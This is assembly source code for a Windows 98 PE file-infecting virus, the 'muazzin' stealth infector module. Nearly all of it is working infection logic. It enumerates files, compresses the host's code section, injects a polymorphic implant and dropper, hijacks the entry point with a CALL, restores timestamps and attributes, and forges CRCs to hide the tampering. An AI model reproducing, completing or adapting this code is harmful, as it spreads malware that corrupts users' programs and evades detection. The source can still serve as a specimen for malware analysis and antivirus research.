;muazzin Win98 EXE stealth infector

BITS 32

%include "\muazzin\muazzin.asi"
%include "\muazzin\samples\pe.inc"

%define DEBUG 1

TYPE    EQU "i_pe"
VERSION EQU 0202h

entry:
       jmp short .entry
       db "Must Rasta live in misery",13,10
       db "And heathens in luxury",13,10
       db "Jah say no...",13,10,0
  .entry:
       mov esi, [esp+4]
       test dword [esi+m_why], MT_QUERY
       jz .noquery
       mov esi, MT_QUERY+MT_APP
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
       jmp .skip1
  .noquery:
       test dword [esi+m_why], MT_APP
       jz near .skip2

       pushad
       call dllinit
       jc near .error

       push dword [ebp+unpackedsize2]
       push byte 40h
       call [ebp+GlobalAlloc]
       mov [ebp+packed_exe], eax
       xchg eax, edi
       mov ecx, [ebp+unpackedsize2]
       mov esi, 12345678h
  dropper equ $-4
       call z_encode
       mov eax, [edi]
       mov [ebp+droppersize], eax

       lea eax, [ebp+lde32buffer]
       push eax
       call disasm_init

       call _malloc_init

       lea eax, [ebp+implant]
       push eax
       push dword implant_size
       lea eax, [ebp+list]
       push eax
       lea eax, [ebp+_malloc]
       push eax
       lea eax, [ebp+_disasm]
       push eax
       call [ebp+GetTickCount]
       call engine
       mov esi, eax

       push esi
       push byte 40h
       call [ebp+GlobalAlloc]
       xchg eax, ecx
       xchg esi, ecx
       xchg edi, esi
       mov [ebp+morphed_body], edi
       mov [ebp+morphed_size], ecx
       rep movsb

       call _malloc_done

       call spread
  .error:
       call dlldone
       popad
  .skip2:
       mov dword [esi+m_result], MR_DONE
  .skip1:
       ret 4


delta:
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta
       ret

dllinit:
       call delta
       mov eax, [esi+m_dropper]
       mov [ebp+dropper], eax
       mov eax, [esi+m_droppersize]
       mov [ebp+unpackedsize2], eax
       mov eax, [esi+GPA]
       mov [ebp+getpaddr], eax
       mov eax, [esi+GMH]
       mov [ebp+getmhnd], eax
       lea esi, [ebp+import_table]
  .next_dll:
       lodsd
       test eax, eax
       jz .all_import
       push esi
       stc
       sbb ebx, ebx
       lea esi, [eax+ebp]
       push esi
       mov eax, 12345678h
  getmhnd equ $-4
       call eax
       test eax, eax
       jnz .dll_in_mem
       push esi
       call [ebp+LoadLibraryA]
       test eax, eax
       jz .error
       mov ebx, eax
  .dll_in_mem:
       xchg ebx, eax                            ;ebx==module handle
       mov ecx, [esp]
       mov [ecx-4], eax                         ;-1==no unload dll
  .skip_dllname:
       lodsb
       test al, al
       jnz .skip_dllname
  .next_import:
       lodsd
       test eax, eax
       jz .dll_done
       add eax, ebp
       push eax
       push ebx
       mov eax, 12345678h
  getpaddr equ $-4
       call eax
       mov [esi-4], eax
       test eax, eax
       jz .error
       jmp short .next_import
  .dll_done:
       pop esi
       jmp short .next_dll
  .error:
       pop esi
       stc
       db 0b0h
  .all_import:
       clc
       ret

dlldone:
       lea esi, [ebp+import_table]
  .next_unload:
       lodsd
       test eax, eax
       jz .all_unload
       inc eax
       jz .next_unload
       dec eax
       push eax
       call [ebp+FreeLibrary]
       jmp short .next_unload
  .all_unload:
       ret

spread:
       call [ebp+InitTmTable]
       sub edi, edi
       lea esi, [ebp+buffer]
  .next
       push esi
       push edi
       call [ebp+GetTmElementByIndex]
       test eax, eax
       jz .done
       push esi
       call infect_pe
       inc edi
       jmp short .next
  .done:
       call [ebp+CloseTmTable]
       ret

handle1 equ 145h
STACK_BUFFER equ 150h

infect_pe:
       pushad
       add esp, -STACK_BUFFER

%ifdef DEBUG
       pushad
       sub esp, 100h
       call delta

       push byte 4
       call .zkips1
       db "Infectar este arquivo?", 0
  .zkips1:
       push dword [esp+(8*4)+STACK_BUFFER+4+(8*4)+100h+2*4]
       push byte 0
       call [ebp+MessageBoxA]
       cmp eax, 7
       je .done123

       mov edi, esp
       mov esi, [edi+(8*4)+STACK_BUFFER+4+(8*4)+100h]
       push byte 1
       push edi
       push esi
  .zopy:
       lodsb
       stosb
       test al, al
       jnz .zopy
       mov dword [edi-1], ".bak"
       mov byte [edi+3], 0
       call [ebp+CopyFileA]
       test eax, eax
  .done123:
       lahf
       add esp, 100h
       sahf
       popad
       jz near .done
%endif
       push esp
       push dword [esp+(8*4)+STACK_BUFFER+8]
       call [ebp+FindFirstFileA]
       mov ecx, eax
       inc ecx
       jz near .done

       push eax
       call [ebp+FindClose]

       push dword 80h
       sub edi, edi
       mov esi, [esp]
       push dword [esp+(8*4)+STACK_BUFFER+8]
       call [ebp+SetFileAttributesA]
       test eax, eax
       jz near .done

       push edi
       push esi
       push byte 3
       push edi
       push edi
       push dword 0C0000000h
       push dword [esp+(8*4)+STACK_BUFFER+7*4]
       call [ebp+CreateFileA]
       mov [esp+handle1], eax
       inc eax
       jz .done0

       push edi
       push dword [esp+32+4]
       push edi
       push byte 4              ;PAGE_READWRITE
       push edi
       push dword [esp+handle1+5*4]
       call [ebp+CreateFileMappingA]
       test eax, eax
       jz .done1
       push eax

       mov ecx, dword [esp+4+32]
       mov [ebp+.mapsize], ecx
       push ecx
       push edi
       push edi
       push dword 0f001fh               ;FILE_MAP_WRITE
       push eax
       call [ebp+MapViewOfFile]
       test eax, eax
       jz .done2

       push eax
       call .check

       call delta
       call [ebp+UnmapViewOfFile]
  .done2:
       call [ebp+CloseHandle]

  .done1:
       lea eax, [esp+20]
       push eax
       sub eax, byte 8
       push eax
       sub eax, byte 8
       push eax
       push dword [esp+handle1+3*4]
       call [ebp+SetFileTime]            ;eax!=0

       push dword [esp+handle1]
       call [ebp+CloseHandle]

  .done0:
       push dword [esp+0]
       push dword [esp+(8*4)+STACK_BUFFER+8]
       call [ebp+SetFileAttributesA]

  .done:
       add esp, STACK_BUFFER
       popad
       ret 4

bp_map   equ 0
bp_entry equ 4
bp_import equ 8
bp_mem   equ 12
bp_size  equ 16
bp_export equ 20

bp_SIZEOF equ 28

  .check:
       pushad
       mov esi, [esp+4+8*4]
       sub esp, bp_SIZEOF
       mov ebp, esp

       mov [ebp+bp_map], esi
       cmp word [esi], "MZ"
       jnz .error000

       push ebp
       call delta

       sub eax, eax
       mov edx, esi
       mov ecx, [ebp+.mapsize]
       call xcrc16                              ;calc crc 16
       mov [ebp+.crc16], eax
       sub eax, eax
       mov edx, esi
       mov ecx, [ebp+.mapsize]
       call xcrc32                              ;calc crc 32
       mov [ebp+.crc32], eax
       xchg ebp, ebx
       pop ebp

       mov eax, dword [esi+3ch]
       cmp eax, [ebx+.mapsize]
       jnb near .error0
       add esi, eax
       cmp dword [esi+PE_HEADER.Signature], "PE"
       jne .error000

       cmp word [esi+PE_HEADER.Machine], 14Ch
       jne .error000
       cmp word [esi+PE_HEADER.Magic], 10Bh
       jne .error000

       movzx eax, word [esi+PE_HEADER.Characteristics]
       not al
       test ax, 2002h
       jnz .error000

       movzx eax, word [esi+PE_HEADER.NumberOfSections]
       cmp al, 8
       ja .error000
       sub al, 3
       jnc .normalf
  .error000:
       jmp .error0
  .normalf:

       mov eax, [esi+PE_HEADER.AddressOfEntryPoint]
       test eax, eax
       jz .error000
       mov [ebp+bp_entry], eax

       mov eax, [esi+PE_HEADER.DataDirectory+IMAGE_DIRECTORY_ENTRY_IMPORT*8+IMAGE_DATA_DIRECTORY.VirtualAddress]
       test eax, eax
       jnz .lsdls1
       dec eax
  .lsdls1:
       mov [ebp+bp_import], eax

       mov eax, [esi+PE_HEADER.DataDirectory+IMAGE_DIRECTORY_ENTRY_EXPORT*8+IMAGE_DATA_DIRECTORY.VirtualAddress]
       test eax, eax
       jnz .lsdls12
       dec eax
  .lsdls12:
       mov [ebp+bp_export], eax

       push ebp
       call delta
       mov ebx, [esi+PE_HEADER.ImageBase]
       mov edi, [esi+0f8h+SECTION_HEADER.SizeOfRawData]

       mov eax, [ebp+list+6*4]        ;host_codesize
       add eax, [ebp+morphed_body]
       mov [eax+1], edi

       mov eax, [ebp+morphed_size]
       add eax, [ebp+droppersize]
       shl eax, 1
       pop ebp

       cmp edi, eax
       jb near .error0                       ;code is too small... if it compress,
                                        ;then is more suspicious even! (goat)
       mov ebx, ebp
       call delta

       pushad
       push edi
       push byte 40h
       call [ebp+GlobalAlloc]
       mov [ebx+bp_mem], eax
       xchg eax, edi
       xchg eax, ecx
       mov esi, [esi+0f8h+SECTION_HEADER.PointerToRawData]
       add esi, [ebx+bp_map]
       call z_encode
       mov eax, [edi]
       mov [ebx+bp_size], eax
       popad

       mov eax, [ebx+bp_size]
       mov ecx, [ebp+morphed_size]
       add ecx, [ebp+droppersize]
       cmp ecx, edi
       jae near .error0                      ;code dont compressed well enought...

       mov ecx, [esi+0f8h+SECTION_HEADER.VirtualAddress]
       add ecx, [esi+0f8h+SECTION_HEADER.SizeOfRawData]

       cmp [ebx+bp_import], ecx
       jb near .error0
       cmp [ebx+bp_export], ecx
       jb near .error0

       mov ecx, [ebx+bp_entry]
       sub ecx, [esi+0f8h+SECTION_HEADER.VirtualAddress]
       cmp ecx, [esi+0f8h+SECTION_HEADER.SizeOfRawData]
       jae near .error0                                      ;entry no in 1st sect

       cmp [esi+0f8h+SECTION_HEADER.VirtualSize], edi
       jae .zkipz
       mov [esi+0f8h+SECTION_HEADER.VirtualSize], edi
  .zkipz:

       bts word [esi+PE_HEADER.Characteristics], 0           ;kill relocs

       cmp ecx, eax
       jb .in_top

  .in_bottom:
       mov edi, [esi+0f8h+SECTION_HEADER.PointerToRawData]
       add edi, [ebx+bp_map]
       mov edx, edi                              ;edx=raw virus
       add ecx, edi
       add edi, [esi+0f8h+SECTION_HEADER.SizeOfRawData]
       sub edi, eax                   ;edi=raw packed code
       jmp short .set

  .in_top:
       mov edi, [esi+0f8h+SECTION_HEADER.PointerToRawData]
       add edi, [ebx+bp_map]                     ;edi=raw packed code
       lea edx, [edi+eax]                        ;edx=raw virus
       add ecx, edi                              ;ecx=raw patch point

  .set:
       push ecx
       push eax
       db 0cch
       mov eax, edi
       sub eax, [esi+0f8h+SECTION_HEADER.PointerToRawData]
       add eax, [esi+0f8h+SECTION_HEADER.VirtualAddress]
       add eax, [esi+PE_HEADER.ImageBase]
       sub eax, [ebx+bp_map]
       mov ecx, [ebp+list+9*4]                        ;base_packed_body
       add ecx, [ebp+morphed_body]
       mov [ecx+1], eax

       pop eax
       pop ecx

       push dword [esi+PE_HEADER.ImageBase]
       mov esi, [ebx+bp_mem]
       xchg ecx, eax
       mov [ebp+save_ebx], ebx
       pop ebx
       push esi

       rep movsb                        ;copy packed body

       mov edi, eax                     ;edi=patch point
       mov eax, [eax]
       mov ecx, [ebp+list+0dh*4]                        ;dword1
       add ecx, [ebp+morphed_body]
       mov [ecx+1], eax
       mov eax, [edi+4]
       mov ecx, [ebp+list+0eh*4]                        ;dword2
       add ecx, [ebp+morphed_body]
       mov [ecx+1], eax
       mov al, 0e8h
       stosb
       stosd
       push edx
       sub edx, edi
       lea esi, [edi-4]
       mov [esi], edx                 ;build CALL virus
       pop edi

       call [ebp+GlobalFree]

       mov eax, [ebp+list+0fh*4]
       add [esi], eax

       mov esi, 12345678
  morphed_body equ $-4

       mov ecx, [ebp+unpackedsize2]
       mov eax, [ebp+list+4*4]
       mov [esi+eax+1], ecx

       mov ecx, [ebp+droppersize]
       add ecx, [ebp+morphed_size]
       mov eax, [ebp+list+0*4]
       mov [esi+eax+1], ecx

       mov eax, [ebp+list+3*4]
       mov edx, [ebp+list+2*4]
       cmp byte [esi+edx], 05
       je .patch
       neg eax                  ;invert for SUB
  .patch:
       mov [esi+edx+1], eax                 ;fix jmp2high

       mov eax, edi
       mov ecx, [ebp+save_ebx]
       sub eax, [ecx+bp_map]
       add ebx, eax
       mov ecx, [ebp+list+1*4]  ;base_virus
       mov [esi+ecx+1], ebx
       mov eax, [ebp+list+9*4]
       add [esi+eax+1], ebx
       mov eax, [ebp+morphed_size]
       add eax, ebx
       mov ecx, [ebp+list+5*4]  ;base_packedhybris
       mov [esi+ecx+1], eax

       mov eax, [ebp+list+6*4]
       lea eax, [eax+1+ebx]
       mov edx, [ebp+list+8*4]
       mov [esi+edx+2], eax
       mov edx, [ebp+list+0bh*4]
       mov [esi+edx+2], eax                 ;fix ptr2 host_codesize

       mov eax, [ebp+list+7*4]
       mov [esi+eax+1], ebx

       lea eax, [eax+1+ebx]
       mov edx, [ebp+list+0ah*4]
       mov [esi+edx+2], eax
       mov edx, [ebp+list+0ch*4]
       mov [esi+edx+2], eax                 ;fix ptr2 base_host

       mov ecx, 12345678h
  morphed_size equ $-4
       rep movsb                        ;copy implant

       mov ecx, 12345678h
  droppersize equ $-4
       mov esi, 12345678h
  packed_exe equ $-4
       rep movsb                        ;copy virus

       mov ebx, 12345678h
  save_ebx equ $-4
       mov edx, [ebx+bp_map]
       mov esi, 12345678h
  .crc16 equ $-4
       mov edi, 12345678h
  .crc32 equ $-4
       mov ecx, 12345678h
  .mapsize equ $-4
       lea ebx, [ecx-6]
       call fuckcrc48                   ;recalculate old crc

  .error0:
       add esp, bp_SIZEOF
       popad
       ret

%include "implant.s"

_disasm:
       pushad
       call delta
       push esi
       lea eax, [ebp+lde32buffer]
       push eax
       call disasm_main
       add esp, 4*2
       mov [esp+7*4], eax
       popad
       ret

_malloc:
       pushad
       call delta
       mov eax, 12345678h
  _malloc_pool equ $-4
       mov [esp+7*4], eax
       add eax, [esp+8*4+4]
       mov [ebp+_malloc_pool], eax
       popad
       ret 4

_malloc_done:
       pushad
       push dword 12345678h
  _malloc_free equ $-4
       call [ebp+GlobalFree]
       popad
       ret

_malloc_init:
       pushad
       push dword 1024*1024
       push byte 40h
       call [ebp+GlobalAlloc]
       mov [ebp+_malloc_pool], eax
       mov [ebp+_malloc_free], eax
       popad
       ret

engine:
incbin "engine\engine.bin"

%include "z_encode.inc"

%include "lde32bin.inc"

%include "fuckcrc.inc"

list:
dd addon_size-implant            ;mov edi    00
dd base_virus-implant            ;mov esi    01
dd jmp2high-implant              ;add eax    02   ptr2 high_entry
dd high_entry-implant            ;           03
dd unpackedsize-implant          ;mov eax    04
dd base_packedhybris-implant     ;push       05
dd host_codesize-implant         ;push       06
dd base_host-implant             ;push       07
dd internal1-implant             ;push[]     08   ptr2 host_codesize
dd base_packed_body-implant      ;mov edi    09
dd internal2-implant             ;push[]     0a   ptr2 base_host
dd internal3-implant             ;push[]     0b   ptr2 host_codesize
dd internal4-implant             ;push[]     0c   ptr2 base_host
dd dword1-implant                ;mov eax    0d
dd dword2-implant                ;mov eax    0e
dd implant-implant               ;entrypoint 0f
dd -1


unpackedsize2 dd 0

import_table dd kernel32
             dd tmapi
%ifdef DEBUG
             dd user32
%endif
             dd 0

kernel32    db "KERNEL32.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
.api005     dd .apiname005
.api006     dd .apiname006
.api007     dd .apiname007
.api008     dd .apiname008
.api009     dd .apiname009
.api010     dd .apiname010
.api011     dd .apiname011
.api012     dd .apiname012
.api013     dd .apiname013
.api014     dd .apiname014
.api015     dd .apiname015
.api016     dd .apiname016
.api017     dd .apiname017
.api018     dd .apiname018
            dd 0
.apiname001 db "LoadLibraryA", 0
.apiname002 db "FreeLibrary", 0
.apiname003 db "CreateFileA", 0
.apiname004 db "CloseHandle", 0
.apiname005 db "GlobalAlloc", 0
.apiname006 db "GlobalFree", 0
.apiname007 db "GetTickCount", 0
.apiname008 db "CreateFileMappingA", 0
.apiname009 db "MapViewOfFile", 0
.apiname010 db "UnmapViewOfFile", 0
.apiname011 db "GetSystemDirectoryA", 0
.apiname012 db "WriteFile", 0
.apiname013 db "FlushFileBuffers", 0
.apiname014 db "FindFirstFileA", 0
.apiname015 db "FindClose", 0
.apiname016 db "SetFileAttributesA", 0
.apiname017 db "SetFileTime", 0
.apiname018 db "CopyFileA", 0


LoadLibraryA       equ kernel32.api001
FreeLibrary        equ kernel32.api002
CreateFileA        equ kernel32.api003
CloseHandle        equ kernel32.api004
GlobalAlloc        equ kernel32.api005
GlobalFree         equ kernel32.api006
GetTickCount       equ kernel32.api007
CreateFileMappingA equ kernel32.api008
MapViewOfFile      equ kernel32.api009
UnmapViewOfFile    equ kernel32.api010
GetSystemDirectoryA equ kernel32.api011
WriteFile          equ kernel32.api012
FlushFileBuffers   equ kernel32.api013
FindFirstFileA     equ kernel32.api014
FindClose          equ kernel32.api015
SetFileAttributesA equ kernel32.api016
SetFileTime        equ kernel32.api017
CopyFileA          equ kernel32.api018


tmapi       db "TMAPI.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
            dd 0
.apiname001 db "InitTmTable", 0
.apiname002 db "CloseTmTable", 0
.apiname003 db "GetTmElementByIndex", 0

InitTmTable         equ tmapi.api001
CloseTmTable        equ tmapi.api002
GetTmElementByIndex equ tmapi.api003

%ifdef DEBUG
user32      db "USER32.DLL", 0
.api001     dd .apiname001
            dd 0
.apiname001 db "MessageBoxA", 0
MessageBoxA equ user32.api001
%endif

lde32buffer times 2048 db -1

buffer:
